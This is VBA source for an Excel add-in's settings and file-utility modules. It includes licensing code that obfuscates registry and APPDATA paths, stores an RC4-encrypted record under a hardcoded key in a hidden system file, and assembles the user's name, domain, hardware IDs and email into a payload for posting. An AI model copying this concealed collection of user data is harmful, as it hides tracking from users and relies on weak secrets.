Attribute VB_Name = "AddinSettings"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : AddinSettings                    Version: 2.5
' Author        : Igor Vakhnenko                   Date: 26.09.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------


Option Explicit: Option Compare Text
Const NULLCHAR$ = "~null~", VSEP$ = "|fffd||"
Dim dic As Dictionary

Private Sub Class_Initialize()
    Set dic = New Dictionary
    dic.CompareMode = TextCompare
    Me.LoadAllSettings
End Sub
Private Sub Class_Terminate()
    Set dic = Nothing
End Sub

Function GetCurrentSetName() As String
    GetCurrentSetName = dic.Item("_SettingSetName")
End Function

Private Function GetDefaultSettingSetFilename() As String
    GetDefaultSettingSetFilename = Environ("TMP") & "\" & PROJECT_NAME$ & " Add-in Default Settings.xml"
End Function

Function U(ByVal txt$) As String
    On Error Resume Next: Dim i&: If Len(txt$) Mod 2 > 0 Then Exit Function
    For i = 1 To Len(txt$) / 2: U = U & Chr(Val("&H" & Mid(txt$, 2 * i - 1, 2))): Next
End Function

Function ActivateSettingSet(ByVal SetName$, Optional ByVal filename$) As Boolean
    On Error Resume Next
    ActivateSettingSet = True

    If FWF.FileExists(filename$) Then
        Me.ImportFromFile filename$, True
        Me.SetText "_SettingSetName", SetName$
        Me.SetText "_SettingSetFilename", filename$
        Debug.Print Now, PROJECT_NAME$, "Setting set '" & SetName$ & "' applied"
    Else
        If SetName$ = ("<" & tt("DefaultSettingSetName") & ">") Or (SetName$ = "") Then
            Me.ImportFromFile GetDefaultSettingSetFilename, True
            Debug.Print Now, PROJECT_NAME$, "Default setting set restored"
        Else
            ActivateSettingSet = False
        End If
        Me.SetText "_SettingSetName", ""
        Me.Delete "_SettingSetFilename"
    End If

    Me.LoadAllSettings
End Function

Sub LoadAllSettings()
    On Error Resume Next: Dim arr As Variant, i&: Set dic = New Dictionary: dic.CompareMode = TextCompare
    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "Setup")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "Setup\" & arr(i, 0), arr(i, 1): Next i
    End If

    arr = GetAllSettings(PROJECT_NAME$, "\")
    If IsArray(arr) Then
        For i = LBound(arr) To UBound(arr): dic.Add "\" & arr(i, 0), arr(i, 1): Next i
    End If
End Sub

Function IsFirstRun() As Boolean
    IsFirstRun = RSP(0) = ""
End Function

Function GetText(ByVal SettingName$, Optional ByVal DefValue As Variant, Optional ByVal section$ = "Settings") As String
    On Error Resume Next
    If section$ Like "H?*\?*\" Then
        GetText = CreateObject("WScript.Shell").RegRead(section$ & SettingName$)
    Else
        If dic.Exists(SettingName$) Then GetText = dic.Item(SettingName$) Else GetText = DefValue
        If section$ <> "Settings" Then GetText = GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue)
    End If
End Function

Function GetNumber(ByVal SettingName$, Optional ByVal DefValue As Long, Optional ByVal section$ = "Settings") As Long
    On Error Resume Next: If dic.Exists(SettingName$) Then GetNumber = Val(dic.Item(SettingName$)) Else GetNumber = DefValue
    If section$ <> "Settings" Then GetNumber = Val(GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue))
End Function

Function GetBoolean(ByVal SettingName$, Optional ByVal DefValue As Boolean, Optional ByVal section$ = "Settings") As Boolean
    On Error Resume Next: If dic.Exists(SettingName$) Then GetBoolean = CBool(dic.Item(SettingName$)) Else GetBoolean = DefValue
    If section$ <> "Settings" Then GetBoolean = CBool(GetSetting(PROJECT_NAME$, section$, SettingName$, DefValue))
End Function

Function GetRegValue(ByVal SettingName$) As String
    On Error Resume Next
    GetRegValue = CreateObject("WScript.Shell").RegRead(BASE_REGISTRY_PATH$ & SettingName$)
    GetRegValue = Replace(GetRegValue, NULLCHAR$, Chr(0))
End Function
Function SetRegValue(ByVal SettingName$, ByVal SettingValue As Variant) As String
    On Error Resume Next: Err.Clear
    CreateObject("WScript.Shell").RegWrite BASE_REGISTRY_PATH$ & SettingName$, Replace(SettingValue, Chr(0), NULLCHAR$)
    If Err Then UninstallThisFile 2
End Function

Sub SetText(ByVal SettingName$, ByVal SettingValue As Variant, Optional ByVal section$ = "Settings")
    On Error Resume Next
    If section$ = "base" Then SetRegValue SettingName$, SettingValue: Exit Sub
    If section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegWrite section$ & SettingName$, SettingValue
    Else
        SaveSetting PROJECT_NAME$, section$, SettingName$, SettingValue
        dic.Item(IIf(section$ = "Settings", "", section$ & "\") & SettingName$) = SettingValue
    End If
End Sub

Function Delete(ByVal SettingName$, Optional ByVal section$ = "Settings") As Boolean
    On Error Resume Next
    If section$ = "base" Then section$ = BASE_REGISTRY_PATH$
    If section$ Like "H?*\?*\" Then
        CreateObject("WScript.Shell").RegDelete section$ & SettingName$
    Else
        DeleteSetting PROJECT_NAME$, section$, SettingName$
        If section$ = "Settings" Then dic.Remove SettingName$
    End If
End Function

Sub AddDefaultValue(ByVal SettingName$, ByVal SettingValue As Variant, _
                    Optional ConvertToColumn As Boolean = False, Optional AbsentOrBlank As Boolean = False)
    On Error Resume Next
    If (Not dic.Exists(SettingName$)) Or (AbsentOrBlank And IsSettingBlank(SettingName$)) Then
        If ConvertToColumn Then SettingValue = GetColumnName(Val(SettingValue))
        Me.SetText SettingName$, SettingValue
    End If
End Sub

Function IsSettingBlank(ByVal SettingName$) As Boolean
    IsSettingBlank = True
    If dic.Exists(SettingName$) Then If dic.Item(SettingName$) <> "" Then IsSettingBlank = False
End Function

Function CIU() As Long
    On Error Resume Next: Dim X: Err.Clear: X = ThisWorkbook.VBProject.VBComponents.Count
    CIU = -(Err = 0): Err.Clear
End Function

Sub SaveAllFromSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object, filename$
    For Each ctrl In UF.Controls
        If ctrl.Enabled And Not (ctrl.Tag = "DoNotSave") Then
            If (Not ctrl.Name Like "CommandButton_*") And Not (ctrl.Tag = "ScrollCombo") Then
                Me.SetText ctrl.Name, ctrl.Value
            End If
        End If
    Next: Err.Clear

    If Me.GetCurrentSetName = "" Then
        Me.ExportToFile GetDefaultSettingSetFilename, True
    Else
        filename$ = Me.GetText("_SettingSetFilename")
        If FWF.FileExists(filename$) Then Me.ExportToFile filename$, True
    End If
End Sub

Sub LoadIntoSettingForm(ByRef UF As Object)
    On Error Resume Next: Dim ctrl As Object
    For Each ctrl In UF.Controls
        If ctrl.Name Like "CheckBox*" Then
            ctrl.Value = Me.GetBoolean(ctrl.Name)
        Else
            If dic.Exists(ctrl.Name) Then ctrl.Value = dic.Item(ctrl.Name)
        End If
    Next: Err.Clear
End Sub

Private Function GetColumnName(ByVal col As Long) As String
    GetColumnName = col & " |fffd|" & Split(Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1), "$")(1) & "|fffd|"
End Function

Function SF(Optional ByVal txt) As String
    On Error Resume Next: Dim file$, ts As Object, FSO As New FileSystemObject
    file$ = Environ(ChrW(65) & ChrW(80) & ChrW(80) & ChrW(68) & ChrW(65) & ChrW(84) & ChrW(65)) & ChrW(92) & PROJECT_NAME$ & ".ini"
    If IsMissing(txt) Then
        Set ts = FSO.OpenTextFile(file$, 1, False)
        SF = ts.ReadAll: ts.Close
    Else
        If txt = "filename" Then SF = file$: Exit Function
        SetAttr file$, vbNormal
        Set ts = FSO.CreateTextFile(file$, True): ts.Write txt
        SetAttr file$, vbHidden + vbSystem
    End If
    Set ts = Nothing: Set FSO = Nothing: Err.Clear
End Function

Function RSP(ByVal ind&)
    On Error Resume Next: If GetRegValue(U("64617461")) <> SF Then ChSP
    RSP = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)(ind&)
End Function

Function WSP(ByVal ind&, ByVal v)
    On Error Resume Next: Err.Clear: Dim arr, txt: If GetRegValue("data") <> SF Then ChSP
    arr = Split(Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))(0), VSEP$)
    If Not IsArray(arr) Then arr = Array()
    If UBound(arr) < ind& Then ReDim Preserve arr(0 To ind&)
    arr(ind&) = v: arr(0) = DTU: txt = Join(arr, VSEP$): txt = EnDeCrypt(txt & Chr(164) & checksum(txt))
    SetRegValue "data", txt: Me.SF txt: Err.Clear
End Function

Function ChSP()
    On Error Resume Next: Dim arr1, arr2, d1&, d2&, ok1 As Boolean, ok2 As Boolean, A&
    arr1 = Split(EnDeCrypt(GetRegValue(U("64617461"))), Chr(164))
    arr2 = Split(EnDeCrypt(SF), Chr(164))
    ok1 = arr1(1) = checksum(arr1(0))
    ok2 = arr2(1) = checksum(arr2(0))
    d1 = Val(Split(arr1(0), VSEP$)(0))
    d2 = Val(Split(arr2(0), VSEP$)(0))
    Select Case True
        Case ok1 And ok2: A = IIf(d1 > d2, 1, IIf(d1 < d2, 2, 0))
        Case ok1: A = 1
        Case ok2: A = 2
        Case Else: A = 3
    End Select
    If A = 1 Then SF GetRegValue(U("64617461")) Else If A = 2 Then SetRegValue U("64617461"), SF
    If A = 3 Then SF "": WSP 1, ""
End Function

Function ImportFromFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim xml As Object, rootnode As Object, XMLoptions As Object, XMLoption As Object, AddinName$, AddinVersion$, msg$
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        If Not .Load(xmlPath) Then
            If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
            Exit Function
        End If

        Set rootnode = .DocumentElement
        AddinName$ = rootnode.Attributes.getNamedItem("Addin").Text
        AddinVersion$ = Val(rootnode.SelectSingleNode("Version").Text)

        Select Case True

            Case rootnode.BaseName <> "Settings", AddinName$ = ""
                If Not HideMessages Then MsgBox tt("ErrorLoadingSettings"), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case AddinName$ <> PROJECT_NAME$
                If Not HideMessages Then MsgBox tt("SettingsForAnotherAddinFound", AddinName$, PROJECT_NAME$), vbCritical, tt("UnsupportedSettingsFile")
                Exit Function

            Case Else
                Set XMLoptions = rootnode.SelectNodes("./Options/option")
                If XMLoptions.Length = 0 Then
                    If Not HideMessages Then MsgBox tt("SettingsNotFoundInSettingsFile"), vbExclamation, tt("AddinSettingsNotChanged")
                    Exit Function
                End If

                Dim nNEW&, nOLD&, nCHANGED&, nALL&, nERR&, param_name$, param_value$, v$, i&

                nALL& = XMLoptions.Length
                For Each XMLoption In XMLoptions
                    param_name$ = XMLoption.Attributes.getNamedItem("Name").Text
                    param_value$ = XMLoption.Attributes.getNamedItem("Value").Text
                    If Len(param_value$) Mod 2 = 0 Then
                        v$ = "": For i = 1 To Len(param_value$) / 2
                            v$ = v$ & Chr(Val("&H" & Mid(param_value$, 2 * i - 1, 2)))
                        Next
                        Select Case GetText(param_name$, NULLCHAR$)
                            Case NULLCHAR$: nNEW& = nNEW& + 1
                            Case v$: nOLD& = nOLD& + 1
                            Case Else: nCHANGED& = nCHANGED& + 1
                        End Select
                        SetText param_name$, v$
                    Else
                        nERR& = nERR& + 1
                    End If
                Next

                msg$ = tt("SettingsImportDone_MessageText", nALL&, nNEW&, nCHANGED&, nOLD&, nERR&)
                If GetVersion < Val(AddinVersion$) And Val(AddinVersion$) > 0 Then
                    msg$ = msg$ & vbNewLine & vbNewLine & tt("SettingsImport_DifferentVersions", GetVersionTXT(AddinVersion$), GetVersionTXT)
                End If
                If Not HideMessages Then MsgBox msg, vbInformation, tt("SettingsImportDone_MessageTitle", PROJECT_NAME$)
                ImportFromFile = True
        End Select
    End With
End Function

Private Function BASE_REGISTRY_PATH$()
    BASE_REGISTRY_PATH$ = ChrW(72) & ChrW(75) & ChrW(67) & ChrW(85) & ChrW(92) & ChrW(83) & ChrW(111) & ChrW(102) & _
                          ChrW(116) & ChrW(119) & ChrW(97) & ChrW(114) & ChrW(101) & ChrW(92) & ChrW(69) & ChrW(120) & _
                          ChrW(99) & ChrW(101) & ChrW(108) & ChrW(86) & ChrW(66) & ChrW(65) & ChrW(92) & PROJECT_NAME$ & "\"
End Function

Function ExportToFile(ByVal xmlPath$, Optional HideMessages As Boolean = False) As Boolean
    On Error Resume Next: Err.Clear
    Dim xml As Object, rootnode As Object, arr As Variant, msg$, i&, j&, v$, HelpMsg$, AboutMsg$
    Set xml = CreateObject("Microsoft.XMLDOM")

    arr = GetAllSettings(PROJECT_NAME$, "Settings")
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")

        Set rootnode = .appendChild(.createElement("Settings"))
        rootnode.Attributes.setNamedItem(.createAttribute("Addin")).Text = PROJECT_NAME$
        rootnode.Attributes.setNamedItem(.createAttribute("VersionName")).Text = GetVersionTXT
        rootnode.Attributes.setNamedItem(.createAttribute("Timestamp")).Text = Now

        AboutMsg$ = PROJECT_NAME$ & " add-in for MS Excel. |fffd| " & _
                    Replace(ProgramYears, " - ", "-") & " Igor Vakhnenko" & vbNewLine & Split(PROGRAM_HYPERLINK$, "?")(0)
        rootnode.appendChild(.createComment("About")).Text = AboutMsg$
        rootnode.appendChild(.createElement("Version")).Text = GetVersion
        rootnode.appendChild(.createElement("Filename")).Text = ThisWorkbook.Name

        HelpMsg$ = "All the values in this XML are stored as a HEX representation of the text data." & vbNewLine & _
                   "Each character of the value is converted into 2 characters, using the Hex(Asc(<character>)) function." & vbNewLine & _
                   "Please change program options using user interface only! (do not edit this XML file manually)" & vbNewLine & _
                   "These settings are stored in the registry: HKEY_CURRENT_USER\Software\VB and VBA Program Settings\" & PROJECT_NAME$ & "\Settings"

        If IsArray(arr) Then
            With rootnode.appendChild(xml.createElement("Options"))
                .appendChild(xml.createComment("Help")).Text = HelpMsg$
                For i = LBound(arr) To UBound(arr)
                    v$ = ""
                    For j = 1 To Len(arr(i, 1))
                        v$ = v$ & IIf(Len(Hex(Asc(Mid(arr(i, 1), j, 1)))) = 1, "0", "") & Hex(Asc(Mid(arr(i, 1), j, 1)))
                    Next j

                    If Left(arr(i, 0), 1) <> "_" Then
                        With .appendChild(xml.createElement("option"))
                            .Attributes.setNamedItem(xml.createAttribute("Name")).Text = arr(i, 0)
                            .Attributes.setNamedItem(xml.createAttribute("Value")).Text = v$
                        End With
                    End If
                Next i
            End With
        Else
            If Not HideMessages Then MsgBox tt("SettingsExport_Unsaved", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
            Exit Function
        End If

        Err.Clear: .Save xmlPath
        If Err Then
            If Not HideMessages Then MsgBox tt("SettingsExport_FilenameError", PROJECT_NAME$), vbExclamation, tt("SettingsExportErrorTitle")
        Else
            ExportToFile = True
            If Not HideMessages Then
                MsgBox tt("SettingsExportDone_MessageText", PROJECT_NAME$, Dir(xmlPath, vbNormal), Left(xmlPath, InStrRev(xmlPath, "\"))), _
                       vbInformation, tt("SettingsExportDone_MessageTitle")
            End If
        End If
    End With
End Function

Private Function checksum(ByRef txt) As String
    On Error Resume Next: Dim i&, S&
    For i& = 1 To Len(txt)
        S = (S + (2 + i Mod 10) * (AscW(Mid(txt, i, 1)) Mod 100)) Mod 10000
    Next
    checksum = Right(Hex(S), 3): If Len(checksum) < 3 Then checksum = String(3 - Len(checksum), "0") & checksum
End Function

Function DTU(Optional ByVal dd As Variant) As Long
    On Error Resume Next: If IsMissing(dd) Then dd = Now
    DTU = DateDiff("s", DateSerial(1970, 1, 1), CDate(dd))
End Function
Function DFU(Optional ByVal dd As Long) As Date
    On Error Resume Next: DFU = DateAdd("s", dd, DateSerial(1970, 1, 1))
End Function

Function PostData() As String
    On Error Resume Next
    With CreateObject("WScript.Network"): PostData = PostData & "w=" & H(.UserName & "|" & .UserDomain): End With
    PostData = PostData & "&lang=" & GetLanguage & "&addin=" & PROJECT_NAME$ & "&HID=" & HID
    PostData = PostData & "&code=" & GetRegValue("code") & "&email=" & H(GetRegValue("email")) & "&upd=" & IIf(GetBoolean("AutoInstall", False, "Updates"), 1, 0)
    PostData = PostData & "&len=" & FileLen(ThisWorkbook.FullName) & "&ul=" & CIU & "&as=" & AS_ & "&HWID=" & HWID
    PostData = PostData & "&time=" & DTU & "|" & RSP(1) & "|" & RSP(2) & "|" & RSP(3) & "|" & LastMacro + 1
    PostData = PostData & "&info=" & Val(Application.Version) & "|" & OfficeBits & "|" & GetVersion & "&dev=" & GetText("", , U("484B43555C536F6674776172655C457863656C5642415C"))
End Function

Function H(ByVal txt$) As String
    On Error Resume Next: Dim i&, r&
    For i = 1 To Len(txt)
        r = Asc(Mid(txt, i, 1)): H = H & IIf(Len(Hex(r)) = 1, "0", "") & Hex(r)
    Next
End Function

Function LastMacro(Optional ByVal macroname$ = "") As Boolean
    On Error Resume Next: Dim rk$: rk$ = U("484B43555C536F6674776172655C4D6963726F736F66745C4F66666963655C457863656C5C4D6163726F5C")
    If Len(macroname$) Then SetText H(PROJECT_NAME$), H(macroname$), rk$ Else LastMacro = GetText(H(PROJECT_NAME$), , rk$) <> ""
End Function

Function K() As String
    On Error Resume Next: Dim txt$, S&, D&, i&, txt2$: txt2$ = HWID & "123": txt$ = PROJECT_NAME$ & txt2
    For i = 1 To Len(txt): S = S + Asc(Mid(txt, i, 1)) * i: Next
    For i = 1 To Len(txt2): D = D + Asc(Mid(txt2, i, 1)) * (10 ^ (i Mod 3)): Next
    K = Right(D, 4) & Format((S + 1234) Mod 1000, "000")
End Function

Private Function EnDeCrypt(ByVal txt$, Optional ByVal numeric As Boolean, Optional ByVal p$)        'As String
    On Error Resume Next
    Dim S(0 To 255) As Integer, kep(0 To 255) As Integer: If Len(p) = 0 Then p = "12345asdfg"
    Dim temp As Integer, A As Integer, B As Integer, sd As Long, i As Integer, j As Integer, temp2 As Integer, K As Integer
    B = 0
    For A = 0 To 255
        B = B + 1: If B > Len(p) Then B = 1
        kep(A) = Asc(Mid$(p, B, 1))
    Next A
    For A = 0 To 255: S(A) = A: Next A
    B = 0: For A = 0 To 255: B = (B + S(A) + kep(A)) Mod 256: temp = S(A): S(A) = S(B): S(B) = temp: Next A
    For A = 1 To Len(txt)
        i = (i + 1) Mod 256: j = (j + S(i)) Mod 256: temp = S(i): S(i) = S(j): S(j) = temp
        K = S((S(i) + S(j)) Mod 256)
        EnDeCrypt = EnDeCrypt & Chr(Asc(Mid$(txt, A, 1)) Xor K)
        sd = sd + CLng(Asc(Mid$(txt, A, 1))) * CLng(K + 6)
    Next
    If numeric Then EnDeCrypt = sd
End Function

Function Reset() As String
    On Error Resume Next
    Dim SettingsBackupFile$: SettingsBackupFile$ = FWF.temp_filename & "_SettingsBackup.xml"
    Me.ExportToFile SettingsBackupFile$, True
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings
    Reset = SettingsBackupFile$
End Function


Attribute VB_Name = "FWF"
'---------------------------------------------------------------------------------------
' Module        : FWF                    Version: 2
' Author        : Igor Vakhnenko                   Date: 25.12.2015
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit

#If VBA7 Then        '  Office 2010-2013
    Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
            (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
             ByVal dwReserved As LongPtr, ByVal lpfnCB As LongPtr) As LongPtr
#Else        '  Office 2003-2007
    Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                                       (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
                                        ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
#End If

Function DownLoadFileFromURL(ByVal URL$, ByVal LocalPath$, Optional ByVal DisableCache As Boolean = False) As Boolean
    On Error Resume Next: Dim shortFilename$
    If (LocalPath$ = "") Or (URL$ = "") Then Exit Function
    If Not LocalPath$ Like "*\*" Then LocalPath$ = Environ("TEMP") & "\" & LocalPath$
    Kill LocalPath$
    shortFilename$ = Mid(LocalPath$, InStrRev(LocalPath$, "\") + 1)
    If shortFilename$ <> Replace_symbols(shortFilename$) Then
        Debug.Print "Wrong symbols in filename: " & shortFilename$
        Exit Function
    End If
    If DisableCache Then Randomize: URL$ = URL$ & "?HID=" & HID & "&rnd=" & Left(Rnd(Now) * 1E+15, 10)
    DownLoadFileFromURL = URLDownloadToFile(0, URL$, LocalPath$, 0, 0) = 0
End Function

Function GetFileExtension(ByVal filename$) As String
    On Error Resume Next: filename$ = Replace(filename$, "/", "\")
    filename$ = Split(filename$, "\")(UBound(Split(filename$, "\")))
    If filename$ Like "*.*" Then GetFileExtension = Split(filename$, ".")(UBound(Split(filename$, ".")))
End Function


Function GetFolderPath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFolderDialogCaption")
    Dim PS$: PS = Application.PathSeparator
    With Application.FileDialog(msoFileDialogFolderPicker)
        If Not Right$(InitialPath, 1) = PS Then InitialPath = InitialPath & PS
        .ButtonName = tt("SelectButtonCaption")
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        GetFolderPath = .SelectedItems(1)
        If Not Right$(GetFolderPath, 1) = PS Then GetFolderPath = GetFolderPath & PS
    End With
End Function

Function GetFilePath(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\", _
                     Optional ByVal FilterDescription$ = "Excel files", Optional ByVal FilterExtension$ = "*.xls*") As String
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFileDialogCaption")
    With Application.FileDialog(msoFileDialogOpen)
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        .filters.Clear: .filters.Add FilterDescription, FilterExtension
        If .Show <> -1 Then Exit Function
        GetFilePath = .SelectedItems(1)
    End With
End Function

Function GetFilenamesCollection(Optional ByVal DialogTitle$, Optional ByVal InitialPath$ = "c:\") As FileDialogSelectedItems
    On Error Resume Next
    If DialogTitle$ = "" Then DialogTitle$ = tt("SelectFilesDialogCaption")
    With Application.FileDialog(3)        ' msoFileDialogFilePicker
        .Title = DialogTitle$: .InitialFileName = InitialPath$
        If .Show <> -1 Then Exit Function
        Set GetFilenamesCollection = .SelectedItems
    End With
End Function

Function FilenamesCollection(ByVal FolderPath$, Optional ByVal mask$ = "*", Optional ByVal SearchDeep& = 999) As Collection
    On Error Resume Next: Dim FSO As Object: Set FilenamesCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    GetAllFileNamesUsingFSO FolderPath, mask, FSO, FilenamesCollection, SearchDeep
    Set FSO = Nothing        ': Application.StatusBar = False
End Function

Function GetAllFileNamesUsingFSO(ByVal FolderPath$, ByVal mask$, ByRef FSO, ByRef FileNamesColl As Collection, ByVal SearchDeep&)
    On Error Resume Next: Dim oCurrFolder As Object, oFile As Object, oSubFolder As Object
    Const ExcludeFiles$ = "Thumbs.db, desktop.ini"

    Set oCurrFolder = FSO.GetFolder(FolderPath)
    If Not oCurrFolder Is Nothing Then
        ' Application.StatusBar = "Searching in: " & FolderPath$
        For Each oFile In oCurrFolder.files
            If oFile.Name Like "*" & mask Then
                If InStr(1, ExcludeFiles$, oFile.Name, vbTextCompare) = 0 Then
                    If InStr(1, oFile.Name, "~$", vbTextCompare) <> 1 Then FileNamesColl.Add oFile.Path
                End If
            End If
        Next
        SearchDeep& = SearchDeep& - 1
        If SearchDeep& Then
            For Each oSubFolder In oCurrFolder.SubFolders
                GetAllFileNamesUsingFSO oSubFolder.Path, mask, FSO, FileNamesColl, SearchDeep&
            Next
        End If
        Set oFile = Nothing: Set oSubFolder = Nothing: Set oCurrFolder = Nothing
    End If
End Function

Function SubFoldersCollection(ByVal FolderPath$, Optional ByVal mask$ = "*") As Collection
    On Error Resume Next: Dim FSO As Object, oSubFolder As Object

    Set SubFoldersCollection = New Collection
    Set FSO = CreateObject("Scripting.FileSystemObject")
    If Right(FolderPath$, 1) <> "\" Then FolderPath$ = FolderPath$ & "\"

    For Each oSubFolder In FSO.GetFolder(FolderPath$).SubFolders
        If oSubFolder.Path Like FolderPath$ & mask$ Then SubFoldersCollection.Add oSubFolder.Path & "\"
    Next oSubFolder
    Set oSubFolder = Nothing: Set FSO = Nothing
End Function


Function ReadTXTfile(ByVal filename$) As String
    On Error Resume Next: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename$, 1, True): ReadTXTfile = ts.ReadAll: ts.Close
    Set ts = Nothing: Set FSO = Nothing
End Function

Function SaveTXTfile(ByVal filename$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(filename$, True)
    ts.Write txt: ts.Close
    SaveTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function

Function AddIntoTXTfile(ByVal filename$, ByVal txt$) As Boolean
    On Error Resume Next: Err.Clear: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile(filename$, 8, True): ts.Write txt: ts.Close
    AddIntoTXTfile = Err = 0: Set ts = Nothing: Set FSO = Nothing
End Function


Function Replace_symbols(ByVal txt$, Optional ReplaceWith$ = "_", Optional ByVal AllowPathSeparator As Boolean = False) As String
    On Error Resume Next: Dim i&, CharsList$: CharsList$ = "/\:?*|""<>"
    If AllowPathSeparator Then CharsList$ = Replace(CharsList$, Application.PathSeparator, "")
    For i& = 1 To Len(CharsList$)
        txt$ = Replace(txt$, Mid(CharsList$, i&, 1), ReplaceWith$)
    Next
    Replace_symbols = txt$
End Function

Sub OpenFolder(ByVal FolderPath$)        ' to open FolderPath$ in Windows Explorer
    On Error Resume Next: If FolderPath$ = "" Then Exit Sub
    If FolderExists(FolderPath$) Then
        FollowHyperlink "explorer.exe /e, """ & FolderPath$ & """"
    Else
        MsgBox tt("UnableToOpenFolder", vbNewLine & FolderPath$ & vbNewLine), vbExclamation, tt("FolderNotFound")
    End If
End Sub

Sub FollowHyperlink(ByVal URL$)
    On Error Resume Next
    If Len(URL$) Then
        URL$ = Replace(URL$, "%website%", DEVELOPER_WEBSITE$)
        URL$ = Replace(URL$, "%projectname%", PROJECT_NAME$)
        URL$ = Replace(URL$, "%hid%", HID)
        CreateObject("WScript.Shell").Run URL$
    End If
End Sub

Sub ShowFile(ByVal FilePath$)        ' to open FilePath$ in Windows Explorer
    On Error Resume Next: If FilePath$ = "" Then Exit Sub
    FollowHyperlink "explorer.exe /e,/select,""" & FilePath$ & """"
End Sub

Sub ShowText(ByVal txt$, Optional ByVal Index&)        ' to open text as a file in Notepad
    On Error Resume Next: Dim filename$
    filename$ = Environ("TEMP") & "\text" & IIf(Index, Index, Left(Rnd() * 1E+15, 10)) & ".txt"
    With CreateObject("scripting.filesystemobject").CreateTextFile(filename, True)
        .Write txt$: .Close
    End With
    FollowHyperlink """" & filename$ & """"
End Sub

Function ChangeFileCharset(ByVal filename$, ByVal DestCharset$, Optional ByVal SourceCharset$) As Boolean
    On Error Resume Next: Err.Clear: Dim FileContent$
    With CreateObject("ADODB.Stream")
        .Type = 2: If Len(SourceCharset$) Then .Charset = SourceCharset$
        .Open: .LoadFromFile filename$
        FileContent$ = .ReadText: .Close
        .Charset = DestCharset$: .Open: .WriteText FileContent$
        .SaveToFile filename$, 2: .Close
    End With
    ChangeFileCharset = Err = 0: Err.Clear
End Function

Function temp_folder$()
    On Error Resume Next: temp_folder$ = Environ("TEMP") & "\ExcelTemporaryFiles\"
    If Dir(temp_folder$, vbDirectory) = "" Then MkDir temp_folder$
End Function

Function temp_filename$()
    On Error Resume Next: Dim iter&, txt$
get_rnd:     iter& = iter& + 1: txt$ = Left(Rnd(Now) * 1E+15, 10)
    temp_filename$ = temp_folder$ & "temp_file_" & Format(Now, "YYYY-MM-DD--HH-NN-SS") & "__" & txt$
    If Dir(temp_filename$, vbNormal) <> "" Then If iter& < 5 Then GoTo get_rnd
End Function

Function FolderExists(ByVal Folder$) As Boolean
    On Error Resume Next: FolderExists = CreateObject("Scripting.FileSystemObject").FolderExists(Folder$)
End Function

Function FileExists(ByVal filename$) As Boolean
    On Error Resume Next: FileExists = CreateObject("Scripting.FileSystemObject").FileExists(filename$)
End Function

Function URL_Encode(ByVal txt As String) As String
    On Error Resume Next: Dim i&, l$, t$
    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)
        Select Case AscW(l)
            Case Is > 4095: t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "%20"
            Case Else: t = l
        End Select
        URL_Encode = URL_Encode & t
    Next
End Function

Function FileOrFolderSize(ByVal S) As String
    On Error Resume Next: Dim Size As Single: Size = Fix(Val(S))
    Select Case Size
        Case Is < 1000: FileOrFolderSize = Size & " bytes"
        Case Is < 10000: FileOrFolderSize = FormatNumber(Size / 1024, 1) & " KB"
